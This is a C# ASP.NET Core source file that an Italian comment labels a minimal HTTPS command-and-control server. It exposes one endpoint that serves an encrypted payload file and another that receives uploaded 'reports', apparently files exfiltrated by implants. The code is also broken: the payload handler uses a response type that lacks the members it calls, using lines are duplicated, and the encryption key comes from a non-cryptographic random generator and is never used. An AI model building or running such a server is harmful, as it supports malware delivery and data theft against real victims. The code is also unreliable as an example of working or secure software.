// See https://aka.ms/new-console-template for more information

using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Http; // Added for HttpRequest
using Microsoft.AspNetCore.Builder;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.AspNetCore.Builder;

/*Server C2 HTTPS minimale con API REST in ASP.NET Core (.NET 7+)*/
// File: Program.cs
var builder = WebApplication.CreateBuilder(args);
builder.Services.AddEndpointsApiExplorer();
builder.Services.AddSwaggerGen();
builder.Services.AddAuthentication("Bearer")
    .AddJwtBearer("Bearer", options =>
    {
        options.Authority = "https://your-auth-server.com"; // Identity Provider
        options.TokenValidationParameters.ValidateAudience = false;
    });

var app = builder.Build();
app.UseSwagger();
app.UseSwaggerUI();
app.UseAuthentication();
app.UseAuthorization();

byte[] aesKey = new byte[32]; // Ideale: scambiate dinamicamente con DH
byte[] aesIV = new byte[16];
Random.Shared.NextBytes(aesKey);
Random.Shared.NextBytes(aesIV);

string storagePath = Path.Combine(AppContext.BaseDirectory, "uploads");
Directory.CreateDirectory(storagePath);

app.MapGet("/api/payload/latest", async (HttpResponseMessage response) =>
{
    // Serve payload AES cifrato
    var payloadFile = Path.Combine(storagePath, "payload.enc");
    if (!File.Exists(payloadFile))
    {
        response.StatusCode = 404;
        return;
    }
    byte[] data = await File.ReadAllBytesAsync(payloadFile);
    response.ContentType = "application/octet-stream";
    await response.Body.WriteAsync(data, 0, data.Length);
});

app.MapPost("/api/reports/upload", async (HttpRequest request) =>
{
    if (!request.HasFormContentType)
        return Results.BadRequest();

    var form = await request.ReadFormAsync();
    var file = form.Files.GetFile("file");
    if (file == null)
        return Results.BadRequest();

    var filePath = Path.Combine(storagePath, Path.GetFileName(file.FileName));
    using var stream = File.Create(filePath);
    await file.CopyToAsync(stream);
    return Results.Ok(new { message = "File uploaded." });
});

app.Run();

